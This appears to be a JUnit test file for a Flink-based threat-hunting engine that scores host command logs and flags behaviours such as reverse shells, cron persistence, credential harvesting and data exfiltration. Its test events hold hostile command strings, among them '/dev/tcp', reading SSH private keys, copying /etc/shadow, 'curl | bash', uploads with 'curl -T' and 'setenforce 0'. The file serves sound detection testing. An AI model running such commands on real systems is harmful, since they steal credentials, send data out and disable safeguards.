package com.sls.hunter.flink;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.InputStream;
import java.time.LocalDate;
import java.util.*;

import org.junit.jupiter.api.Test;

class RulesTest {
  static MiningConfig config() {
    Properties p = new Properties();
    p.setProperty("fleet.mode", "exact");
    p.setProperty("target.start.date", "2026-06-10");
    return new MiningConfig(p);
  }

  static Event event(String id, String family, String day, String host, String proc, String cmd) {
    return Event.parse(
        Json.write(
            Json.obj(
                "event_id",
                id,
                "index_family",
                family,
                "payload",
                Json.obj(
                    "@timestamp",
                    day + "T10:00:00+08:00",
                    "host_ip",
                    host,
                    "username",
                    "root",
                    "proc_name",
                    proc,
                    "cmdline",
                    cmd))));
  }

  @Test
  @SuppressWarnings("unchecked")
  void pythonOracle() throws Exception {
    try (InputStream in = getClass().getResourceAsStream("/oracle.json")) {
      List<Map<String, Object>> cases = Json.MAPPER.readValue(in, List.class);
      int i = 0;
      for (Map<String, Object> c : cases) {
        List<Event> s = new ArrayList<>();
        for (Map<String, Object> row : (List<Map<String, Object>>) c.get("samples")) {
          Event e = new Event();
          e.fields = row;
          s.add(e);
        }
        // The historical oracle used prefix-only external-IP detection. Retain it for
        // cases unaffected by the intentional address-classification change.
        boolean legacyExternal = s.stream().anyMatch(e -> e.s("type").equals("Connect")
            && !e.s("dst_ip").isEmpty() && !e.s("dst_ip").startsWith("10.")
            && !e.s("dst_ip").startsWith("172.") && !e.s("dst_ip").startsWith("192.168."));
        boolean currentExternal = s.stream().anyMatch(e -> e.s("type").equals("Connect")
            && IpAddresses.scope(e.s("dst_ip")) == IpAddresses.Scope.PUBLIC);
        if (!"tracing_sas_linux".equals(c.get("family")) && legacyExternal != currentExternal) {
          i++;
          continue;
        }
        Scoring.Adjustment a =
            Scoring.adjust(
                c.get("family").toString(),
                ((Number) c.get("base")).doubleValue(),
                c.get("proc").toString(),
                s,
                (Map<String, Integer>) c.get("templates"),
                (Map<String, Integer>) c.get("chains"),
                new HashSet<String>((List<String>) c.get("paths")),
                ((Number) c.get("fleet")).intValue());
        assertEquals(
            ((Number) c.get("expected")).doubleValue(), a.score(), 0.00001, "case " + i + " " + c);
        assertEquals(
            ((Map<?, ?>) c.get("detail")).get("structural_reasons"),
            a.breakdown().get("structural_reasons"),
            "reasons " + i);
        i++;
      }
    }
  }

  @Test
  void templatesAndBoundary() {
    assertEquals("echo <*>", Templates.command("echo １２３"));
    assertEquals("/api/<N>", Templates.uri("/api/１２３"));
    assertEquals(
        "curl <URL> <*> /tmp/<*>", Templates.command("curl https://a.test/1 123 /tmp/123"));
    assertEquals("/api/<ID>/<N>", Templates.uri("/api/abcdef0123/42?q=12"));
    assertEquals(J8.list("a", "b"), Templates.parents("[{\"x\":\"a\"},\"b\"]"));
    assertEquals("a → b", Templates.chain("[\"a\",\"b\"]"));
  }

  @Test
  void identityAndEarliestSamples() {
    DayBucket b = new DayBucket();
    for (int i = 15; i >= 0; i--) {
      Event e = event("e" + i, "tracing_sas_linux", "2026-06-10", "a", "echo", "echo " + i);
      e.time = i;
      assertTrue(b.add(e));
      assertFalse(b.add(e));
    }
    assertEquals(16, b.events);
    assertEquals(12, b.triples.values().iterator().next().samples.size());
    assertEquals(0, b.triples.values().iterator().next().samples.get(0).time);
  }

  @Test
  void dnsThresholdUsesFullCountPerHost() throws Exception {
    DayBucket bucket = new DayBucket();
    for (int i = 0; i < 50; i++) {
      bucket.add(event("a" + i, "tracing_sas_linux", "2026-06-10", "a", "dig", "dig example.org"));
      if (i < 49) bucket.add(event("b" + i, "tracing_sas_linux", "2026-06-10", "b", "dig", "dig example.org"));
    }
    bucket = Json.MAPPER.readValue(Json.write(bucket), DayBucket.class);
    Properties p = new Properties();
    p.setProperty("history.compare", "false");
    List<Map<String, Object>> rows = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"),
        Collections.singletonMap("2026-06-10", bucket), new MiningConfig(p)).signals();
    List<Map<String, Object>> dns = new ArrayList<>();
    for (Map<String, Object> row : rows) if ("dns_high_freq_suspicious".equals(row.get("behavior_label"))) dns.add(row);
    assertEquals(1, dns.size());
    assertEquals("a", dns.get(0).get("host_ip"));
    assertEquals(50L, dns.get(0).get("hit_count"));
  }

  @Test
  void behaviorCountsArePerHostFullAndIgnoreReadOnlyCronCommands() {
    DayBucket baseline = new DayBucket(), target = new DayBucket();
    for (int i = 0; i < 40; i++) {
      baseline.add(event("base" + i, "tracing_sas_linux", "2026-06-09", "a", "bash", "bash /dev/tcp/x"));
    }
    for (int i = 0; i < 100; i++) {
      Event e = event("target" + i, "tracing_sas_linux", "2026-06-10", "a", "bash", "bash /dev/tcp/x");
      target.add(e);
    }
    target.add(event("other", "tracing_sas_linux", "2026-06-10", "b", "bash", "bash /dev/tcp/x"));
    for (int i = 0; i < 35; i++) {
      Event e = event("excluded" + i, "tracing_sas_linux", "2026-06-10", "c", "bash", "crontab -l");
      e.fields.put("cmd_chain", "apt");
      target.add(e);
    }
    target.add(event("included", "tracing_sas_linux", "2026-06-10", "c", "bash", "echo task > /etc/cron.d/foo"));
    Map<String, DayBucket> days = new HashMap<>();
    days.put("2026-06-09", baseline); days.put("2026-06-10", target);
    List<Map<String, Object>> rows = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals();
    Map<String, Object> a = rows.stream().filter(r -> "reverse_shell".equals(r.get("behavior_label")) && "a".equals(r.get("host_ip"))).findFirst().orElseThrow(IllegalStateException::new);
    assertEquals(100L, a.get("hit_count"));
    assertEquals(40L, a.get("baseline_max_count"));
    assertEquals(2.44, a.get("spike_ratio"));
    assertTrue(rows.stream().anyMatch(r -> "reverse_shell".equals(r.get("behavior_label")) && "b".equals(r.get("host_ip"))));
    Map<String, Object> c = rows.stream().filter(r -> "cron_persistence".equals(r.get("behavior_label")) && "c".equals(r.get("host_ip"))).findFirst().orElseThrow(IllegalStateException::new);
    assertEquals(1L, c.get("hit_count"));
  }

  @Test
  void legacyBehaviorStateRequiresReplay() throws Exception {
    DayBucket old = Json.MAPPER.readValue("{\"patterns\":{\"reverse_shell\":{\"count\":40,\"samples\":[]}}}", DayBucket.class);
    assertThrows(IllegalStateException.class, () -> old.add(event("a", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo")));
    assertThrows(IllegalStateException.class, () -> MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), Collections.singletonMap("2026-06-10", old), config()));
  }

  @Test
  void lateralCountsOnlyNovelDestinationsAfterSamplingLimit() {
    DayBucket baseline = new DayBucket(), target = new DayBucket();
    Event known = event("base", "tracing_sas_linux", "2026-06-09", "a", "ssh", "ssh user@host");
    known.fields.put("dst_ip", "10.0.0.1");
    baseline.add(known);
    for (int i = 0; i < 38; i++) {
      Event e = event("ssh" + i, "tracing_sas_linux", "2026-06-10", "a", "ssh", "ssh user@host");
      e.time += i;
      e.fields.put("dst_ip", i < 35 ? "10.0.0.1" : "10.0.0.2");
      target.add(e);
    }
    Map<String, DayBucket> days = new HashMap<>();
    days.put("2026-06-09", baseline); days.put("2026-06-10", target);
    Map<String, Object> row = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals().stream()
        .filter(r -> "ssh_lateral_novel_target".equals(r.get("behavior_label"))).findFirst().orElseThrow(IllegalStateException::new);
    assertEquals(3L, row.get("hit_count"));
    assertEquals(0L, row.get("baseline_max_count"));
  }

  @Test
  void lateralBaselineUsesSourceUserAndAllHistoryIncludingSftp() throws Exception {
    DayBucket baseline = new DayBucket(), target = new DayBucket();
    Event known = event("known", "tracing_sas_linux", "2026-06-09", "a", "sftp", "sftp host");
    known.fields.put("username", "alice"); known.fields.put("dst_ip", "fd00::1"); baseline.add(known);
    Event unknownUser = event("unknown-user", "tracing_sas_linux", "2026-06-09", "a", "ssh", "ssh host");
    unknownUser.fields.put("username", ""); unknownUser.fields.put("dst_ip", "fd00::1"); baseline.add(unknownUser);
    Event unknownHost = event("unknown-host", "tracing_sas_linux", "2026-06-09", "", "ssh", "ssh host");
    unknownHost.fields.put("username", "alice"); unknownHost.fields.put("dst_ip", "fd00::1"); baseline.add(unknownHost);
    for (int i = 0; i < 501; i++) {
      Event noise = event("noise" + i, "tracing_sas_linux", "2026-06-09", "c", "ssh", "ssh host");
      noise.time += i + 1; noise.fields.put("dst_ip", "10.0.0.2"); baseline.add(noise);
    }
    String[] hosts = {"a", "a", "b", "a", "a", ""};
    String[] users = {"alice", "bob", "alice", "", "alice", "alice"};
    String[] ips = {"FD00:0:0:0:0:0:0:1", "fd00::1", "fd00::1", "fd00::1", "example.org", "fd00::1"};
    for (int i = 0; i < hosts.length; i++) {
      Event e = event("target" + i, "tracing_sas_linux", "2026-06-10", hosts[i], "ssh", "ssh user@host");
      e.fields.put("username", users[i]); e.fields.put("dst_ip", ips[i]); target.add(e);
    }
    baseline = Json.MAPPER.readValue(Json.write(baseline), DayBucket.class);
    target = Json.MAPPER.readValue(Json.write(target), DayBucket.class);
    Map<String, DayBucket> days = new HashMap<>(); days.put("2026-06-09", baseline); days.put("2026-06-10", target);
    List<Map<String, Object>> rows = new ArrayList<>();
    for (Map<String, Object> row : MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals())
      if ("ssh_lateral_novel_target".equals(row.get("behavior_label"))) rows.add(row);
    assertEquals(4, rows.size());
    assertFalse(rows.stream().anyMatch(r -> "a".equals(r.get("host_ip")) && "alice".equals(r.get("username"))));
    assertTrue(rows.stream().anyMatch(r -> "a".equals(r.get("host_ip")) && "bob".equals(r.get("username"))));
    assertTrue(rows.stream().anyMatch(r -> "b".equals(r.get("host_ip")) && "alice".equals(r.get("username"))));
    assertTrue(rows.stream().anyMatch(r -> "a".equals(r.get("host_ip")) && "".equals(r.get("username"))));
    assertTrue(rows.stream().anyMatch(r -> "".equals(r.get("host_ip")) && "alice".equals(r.get("username"))));
  }

  private static boolean behaviorHit(String label, Event event) {
    Map<String, Object> pattern = Behavior.patterns().stream()
        .filter(p -> label.equals(p.get("label"))).findFirst().orElseThrow(IllegalStateException::new);
    return Behavior.matches(pattern.get("query"), event) && Behavior.included(pattern, event);
  }

  @Test
  void operationalCommandsDoNotImplyMaliciousBehavior() {
    String family = "tracing_sas_linux", day = "2026-06-10";
    for (String command : J8.list("crontab -l", "crontab -u root -l", "cat /etc/cron.d/backup", "ls /var/spool/cron"))
      assertFalse(behaviorHit("cron_persistence", event(command, family, day, "a", "bash", command)), command);
    for (String command : J8.list("crontab -e", "crontab -u root -e", "crontab /tmp/task", "echo task >> /etc/cron.d/task", "cp /tmp/task /etc/cron.d/task"))
      assertTrue(behaviorHit("cron_persistence", event(command, family, day, "a", "bash", command)), command);
    for (String command : J8.list("cat /root/.ssh/known_hosts", "cat /root/.ssh/id_rsa.pub", "ls /etc/shadow", "chmod 600 /root/.ssh/id_rsa"))
      assertFalse(behaviorHit("credential_harvest", event(command, family, day, "a", "bash", command)), command);
    for (String command : J8.list("cat /root/.ssh/id_rsa", "cp /etc/shadow /tmp/shadow", "base64 /root/.ssh/id_ed25519"))
      assertTrue(behaviorHit("credential_harvest", event(command, family, day, "a", "bash", command)), command);
    assertFalse(behaviorHit("data_exfil", event("scp", family, day, "a", "scp", "scp file user@host:/tmp/file")));
    assertTrue(behaviorHit("data_exfil", event("curl", family, day, "a", "curl", "curl -T /tmp/data https://example.org")));
    assertFalse(behaviorHit("security_disable", event("fw", family, day, "a", "firewall-cmd", "firewall-cmd --add-port=443/tcp")));
    assertFalse(behaviorHit("security_disable", event("iptables", family, day, "a", "iptables", "iptables -A INPUT -j ACCEPT")));
    assertTrue(behaviorHit("security_disable", event("disable", family, day, "a", "setenforce", "setenforce 0")));
    assertFalse(behaviorHit("port_listen_bind", event("sync", family, day, "a", "sync", "sync -l python")));
    assertTrue(behaviorHit("port_listen_bind", event("nc", family, day, "a", "nc", "nc -l 4444")));
    assertTrue(behaviorHit("port_listen_bind", event("python", family, day, "a", "python3", "python3 -m http.server 8000")));
  }

  @Test
  void processAndParentNamesDoNotSuppressMatchedBehaviorInEitherChannel() {
    Event event = event("e", "tracing_sas_linux", "2026-06-10", "a", "ansible", "cat /etc/shadow");
    event.fields.put("cmd_chain", "[\"/usr/bin/apt update\",\"/usr/bin/docker run\"]");
    assertTrue(behaviorHit("credential_harvest", event));
    DayBucket bucket = new DayBucket();
    bucket.add(event);
    WindowMining.recordHighRisk(bucket, event);
    Properties p = new Properties(); p.setProperty("history.compare", "false");
    assertTrue(MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), Collections.singletonMap("2026-06-10", bucket), new MiningConfig(p)).signals().stream()
        .anyMatch(row -> "credential_harvest".equals(row.get("behavior_label"))));
    assertTrue(WindowMining.evaluateChannels("tracing_sas_linux", bucket, Collections.<DayBucket>emptyList(), false, new MiningConfig(p)).signals().stream()
        .anyMatch(row -> "credential_harvest".equals(row.get("behavior_label"))));
    Event cron = event("cron", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo x > /etc/cron.d/test");
    cron.fields.put("cmd_chain", "[\"/opt/capture-agent\"]");
    assertTrue(behaviorHit("cron_persistence", cron));
    Event listener = event("listener", "tracing_sas_linux", "2026-06-10", "a", "nc", "nc -l 4444");
    listener.fields.put("cmd_chain", "[\"/usr/bin/docker run\"]");
    assertTrue(behaviorHit("port_listen_bind", listener));
  }

  @Test
  void previousRuleVersionRequiresReplayEvenWithNoPriorHits() throws Exception {
    DayBucket old = Json.MAPPER.readValue("{\"events\":1}", DayBucket.class);
    DayBucket previous = Json.MAPPER.readValue("{\"events\":1,\"behaviorRulesVersion\":2}", DayBucket.class);
    DayBucket sampled = Json.MAPPER.readValue("{\"events\":1,\"behaviorRulesVersion\":3}", DayBucket.class);
    assertThrows(IllegalStateException.class, () -> old.add(event("new", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo")));
    assertThrows(IllegalStateException.class, () -> previous.add(event("new", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo")));
    assertThrows(IllegalStateException.class, () -> sampled.add(event("new", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo")));
    assertThrows(IllegalStateException.class, () -> WindowMining.evaluateChannels("tracing_sas_linux", old,
        Collections.<DayBucket>emptyList(), false, config()));
  }

  @Test
  void baselineIsSumNotPeak() {
    Map<String, DayBucket> days = new TreeMap<String, DayBucket>();
    for (int d = 5; d <= 9; d++) {
      DayBucket b = new DayBucket();
      for (int i = 0; i < 2; i++)
        b.add(event(d + "-" + i, "tracing_sas_linux", "2026-06-0" + d, "a", "echo", "echo hi"));
      days.put("2026-06-0" + d, b);
    }
    DayBucket target = new DayBucket();
    for (int i = 0; i < 22; i++)
      target.add(event("t" + i, "tracing_sas_linux", "2026-06-10", "a", "echo", "echo hi"));
    days.put("2026-06-10", target);
    MiningEngine.Result r =
        MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config());
    Map<String, Object> s =
        r.signals().stream()
            .filter(m -> m.get("proc_name").equals("echo"))
            .findFirst()
            .orElseThrow(IllegalStateException::new);
    assertEquals(10L, s.get("baseline_count_max"));
    assertEquals(2.0, s.get("spike_ratio"));
    assertEquals(1, s.get("fleet_proc_hosts_in_baseline"));
  }

  @Test
  void unseenBehaviorAfterSampleLimitChangesTemplates() {
    DayBucket b = new DayBucket();
    for (int i = 0; i < 9; i++) {
      Event e =
          event(
              "t" + i,
              "tracing_sas_linux",
              "2026-06-10",
              "a",
              "echo",
              i < 8 ? "echo hello" : "echo OTHER");
      e.time = i;
      b.add(e);
    }
    MiningEngine.Result r =
        MiningEngine.evaluate(
            "tracing_sas_linux", LocalDate.parse("2026-06-10"), Collections.singletonMap("2026-06-10", b), config());
    Map<String, Object> s =
        r.signals().stream()
            .filter(m -> m.get("proc_name").equals("echo"))
            .findFirst()
            .orElseThrow(IllegalStateException::new);
    assertEquals(2, ((List<?>) s.get("novel_templates")).size());
  }

  @Test
  void structureAfterSampleLimitIsStillDetected() throws Exception {
    Properties p = new Properties(); p.setProperty("history.compare", "false");
    DayBucket bucket = new DayBucket();
    for (int i = 0; i < 20; i++) {
      Event e = event("normal" + i, "tracing_sas_linux", "2026-06-10", "a", "curl", "curl https://example.org");
      e.time += i; bucket.add(e);
    }
    Event attack = event("attack", "tracing_sas_linux", "2026-06-10", "a", "curl", "curl https://example.org | bash");
    attack.time += 100; bucket.add(attack);
    bucket = Json.MAPPER.readValue(Json.write(bucket), DayBucket.class);
    Map<String, Object> row = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"),
        Collections.singletonMap("2026-06-10", bucket), new MiningConfig(p)).signals().stream()
        .filter(s -> "rule_match".equals(s.get("signal_type"))).findFirst().orElseThrow(IllegalStateException::new);
    assertTrue(((List<?>) ((Map<?, ?>) row.get("score_breakdown")).get("structural_reasons")).contains("pipe_to_interpreter"));
    assertEquals(21L, row.get("target_count"));
  }

  @Test
  void templateAndChainComparisonUsesFullBaselineAndTarget() {
    DayBucket baseline = new DayBucket(), target = new DayBucket();
    for (int i = 0; i < 14; i++) {
      Event e = event("b" + i, "tracing_sas_linux", "2026-06-09", "a", "echo", i == 13 ? "echo known" : "echo ordinary");
      e.time += i; e.fields.put("cmd_chain", i == 13 ? "[\"known-parent\"]" : "[\"ordinary-parent\"]"); baseline.add(e);
    }
    for (int i = 0; i < 31; i++) {
      Event e = event("t" + i, "tracing_sas_linux", "2026-06-10", "a", "echo", i == 30 ? "echo novel" : "echo known");
      e.time += i; e.fields.put("cmd_chain", i == 30 ? "[\"novel-parent\"]" : "[\"known-parent\"]"); target.add(e);
    }
    Map<String, DayBucket> days = new HashMap<>(); days.put("2026-06-09", baseline); days.put("2026-06-10", target);
    Map<String, Object> row = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals().stream()
        .filter(s -> "echo".equals(s.get("proc_name")) && s.containsKey("novel_templates"))
        .findFirst().orElseThrow(IllegalStateException::new);
    assertEquals(1, ((List<?>) row.get("novel_templates")).size());
    assertTrue(Json.write(row.get("novel_templates")).contains("echo novel"));
    assertTrue(Json.write(row.get("novel_chain_signatures")).contains("novel-parent"));
    assertFalse(Json.write(row.get("novel_chain_signatures")).contains("known-parent"));
  }

  @Test
  void baselineFetchParentPathsAreNotLimitedToMostRecentSamples() {
    DayBucket baseline = new DayBucket(), target = new DayBucket();
    for (int i = 0; i < 121; i++) {
      Event e = event("b" + i, "tracing_sas_linux", "2026-06-09", "b", "curl", "curl http://example.org");
      e.time += i; e.fields.put("cmd_chain", i == 0 ? "[\"bash /usr/bin/known-parent\"]" : "[\"bash /usr/bin/other-parent\"]");
      baseline.add(e);
    }
    for (int i = 0; i < 2; i++) {
      Event e = event("t" + i, "tracing_sas_linux", "2026-06-10", "a", "curl", "curl http://example.org");
      e.fields.put("cmd_chain", "[\"bash /usr/bin/known-parent\"]"); target.add(e);
    }
    Map<String, DayBucket> days = new HashMap<>(); days.put("2026-06-09", baseline); days.put("2026-06-10", target);
    Map<String, Object> row = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals().stream()
        .filter(s -> "curl".equals(s.get("proc_name")) && s.containsKey("score_breakdown"))
        .findFirst().orElseThrow(IllegalStateException::new);
    assertFalse(((List<?>) ((Map<?, ?>) row.get("score_breakdown")).get("structural_reasons")).contains("novel_shell_parent_path"));
  }

  @Test
  @SuppressWarnings("unchecked")
  void historyCompareOffKeepsRuleHitsOnly() {
    Properties properties = new Properties();
    properties.setProperty("fleet.mode", "exact");
    properties.setProperty("history.compare", "false");
    properties.setProperty("target.start.date", "2026-06-10");
    DayBucket bucket = new DayBucket();
    bucket.add(event("e1", "tracing_sas_linux", "2026-06-10", "10.0.0.8", "echo", "echo hi"));
    bucket.add(event("g", "tracing_sas_linux", "2026-06-10", "10.0.0.8", "ngrok", "ngrok http 80"));
    bucket.add(
        event(
            "c",
            "tracing_sas_linux",
            "2026-06-10",
            "10.0.0.8",
            "curl",
            "curl http://a.test | bash"));
    MiningEngine.Result result =
        MiningEngine.evaluate(
            "tracing_sas_linux",
            LocalDate.parse("2026-06-10"),
            Collections.singletonMap("2026-06-10", bucket),
            new MiningConfig(properties));
    assertTrue(result.signals().stream().noneMatch(signal -> signal.get("proc_name").equals("echo")));
    assertEquals(Boolean.FALSE, result.stats().get("history_compare"));
    Map<String, Object> gateway =
        result.signals().stream()
            .filter(signal -> signal.get("proc_name").equals("ngrok") && signal.get("signal_type").equals("rule_match"))
            .findFirst()
            .orElseThrow(IllegalStateException::new);
    assertTrue(
        ((List<?>) ((Map<?, ?>) gateway.get("score_breakdown")).get("structural_reasons"))
            .contains("rare_gateway_proc"));
    Map<String, Object> piped =
        result.signals().stream()
            .filter(signal -> signal.get("proc_name").equals("curl"))
            .findFirst()
            .orElseThrow(IllegalStateException::new);
    assertEquals("rule_match", piped.get("signal_type"));
    assertTrue(
        ((List<?>) ((Map<?, ?>) piped.get("score_breakdown")).get("structural_reasons"))
            .contains("pipe_to_interpreter"));
    assertTrue(
        result.signals().stream()
            .noneMatch(
                signal ->
                    J8.set("novel_host", "novel_triple", "history_diff", "novel_template")
                        .contains(signal.get("signal_type"))));
  }

  @Test
  void nginxRule() {
    DayBucket b = new DayBucket();
    for (int i = 0; i < 2; i++) {
      Event e = event("n" + i, "tracing_nginx_hertzbeat", "2026-06-10", "a", "", "");
      e.fields.put("uri", "/new/42?q=1");
      e.fields.put("upstream_addr", "10.0.0.1:80");
      b.add(e);
    }
    MiningEngine.Result r =
        MiningEngine.evaluate(
            "tracing_nginx_hertzbeat",
            LocalDate.parse("2026-06-10"),
            Collections.singletonMap("2026-06-10", b),
            config());
    assertEquals(2, r.signals().size());
    assertEquals(44.8, ((Number) r.signals().get(0).get("score")).doubleValue());
  }

  @Test
  void targetStartDefaultsToThreeDaysBeforeStart() {
    Properties properties = new Properties();
    properties.setProperty("fleet.mode", "exact");
    assertEquals(LocalDate.now(Event.ZONE).minusDays(3), new MiningConfig(properties).firstTarget);
    properties.setProperty("target.start.date", " 2026-06-10 ");
    assertEquals(LocalDate.parse("2026-06-10"), new MiningConfig(properties).firstTarget);
  }

  @Test
  void classpathConfig() throws Exception {
    MiningConfig loaded = MiningConfig.load(new String[] {"--config", "classpath:config/sample.properties"});
    assertEquals("classpath-test:9092", loaded.get("kafka.bootstrap.servers", ""));
    assertThrows(
        IllegalArgumentException.class,
        () -> MiningConfig.load(new String[] {"--config", "classpath:missing.properties"}));
  }

  @Test
  void malformedInputRejected() {
    assertThrows(IllegalArgumentException.class, () -> Event.parse("{}"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            Event.parse(
                "{\"index_family\":\"tracing_sas_linux\",\"payload\":{\"@timestamp\":\"2026-06-10\"}}"));
  }

  @Test
  void rawSasRecordTakesFamilyFromTopic() {
    Event event =
        Event.parse(
            "{\"@timestamp\":\"2026-06-10T12:00:00+08:00\",\"host_ip\":\"10.0.0.2\",\"username\":\"root\",\"proc_name\":\"curl\",\"cmdline\":\"curl http://example.org/a\",\"cmd_chain\":\"[]\"}",
            "topic-sas-linux-test",
            5,
            1045024395L,
            Collections.<String, String>emptyMap());
    assertEquals("tracing_sas_linux", event.family);
    assertEquals("EVENT", event.kind);
    assertEquals("2026-06-10", event.day);
    assertEquals("topic-sas-linux-test:5:1045024395", event.id);
    assertEquals("10.0.0.2", event.s("host_ip"));
    assertEquals("curl", event.s("proc_name"));
    String stamped = "{\"@timestamp\":\"2026-06-10T12:00:00+08:00\"}";
    assertEquals(
        "tracing_sas_win",
        Event.parse(stamped, "topic-sas-win-test", 0, 1L, Collections.<String, String>emptyMap())
            .family);
    assertEquals(
        "tracing_sas_jumper",
        Event.parse(stamped, "topic-sas-jumper-test", 0, 1L, Collections.<String, String>emptyMap())
            .family);
  }

  @Test
  void documentIdAndIndexNameIdentifyRawRecord() {
    Map<String, String> families = new HashMap<String, String>();
    families.put("custom-topic", "tracing_sas_win");
    Event configured =
        Event.parse(
            "{\"_id\":\"doc-1\",\"@timestamp\":\"2026-06-10T12:00:00+08:00\",\"host_ip\":\"10.0.0.3\",\"proc_name\":\"cmd.exe\"}",
            "custom-topic",
            0,
            1L,
            families);
    assertEquals("tracing_sas_win", configured.family);
    assertEquals("doc-1", configured.id);
    Event wrapped =
        Event.parse(
            "{\"_index\":\"aiops-sas-linux-test-2026.06.10\",\"_id\":\"abc\",\"_source\":{\"@timestamp\":\"2026-06-10T12:00:00+08:00\",\"host_ip\":\"10.0.0.2\",\"proc_name\":\"curl\"}}",
            "unknown-topic",
            0,
            8L,
            Collections.<String, String>emptyMap());
    assertEquals("tracing_sas_linux", wrapped.family);
    assertEquals("abc", wrapped.id);
    assertEquals("curl", wrapped.s("proc_name"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            Event.parse(
                "{\"index_family\":\"sas_linux\",\"@timestamp\":\"2026-06-10T12:00:00+08:00\"}",
                "topic-sas-linux-test",
                0,
                1L,
                Collections.<String, String>emptyMap()));
  }

  @Test
  void rawConnectLogUsesStartTimeAndCmdChain() {
    String chain =
        Json.write(
            J8.list(
                Json.obj(
                    "1559560", "/usr/bin/python3 /opt/nmap-tools/nmap_tools.py /data/scanner.conf")));
    Event event =
        Event.parse(
            Json.write(
                Json.obj(
                    "host_ip",
                    "172.31.25.3",
                    "username",
                    "root",
                    "proc_name",
                    "python3.9",
                    "pid",
                    "1559560",
                    "proc_start_time",
                    "2026-11-06 02:00:01",
                    "start_time",
                    "1793913969",
                    "uuid",
                    "inet-same",
                    "cmd_chain",
                    chain)),
            "topic-sas-linux-test",
            5,
            1045024395L,
            Collections.<String, String>emptyMap());
    assertEquals("tracing_sas_linux", event.family);
    assertEquals("2026-11-06", event.day);
    assertEquals(1793913969L * 1000L, event.time);
    assertEquals("topic-sas-linux-test:5:1045024395", event.id);
    assertEquals(
        "/usr/bin/python3 /opt/nmap-tools/nmap_tools.py /data/scanner.conf", event.s("cmdline"));
  }
}
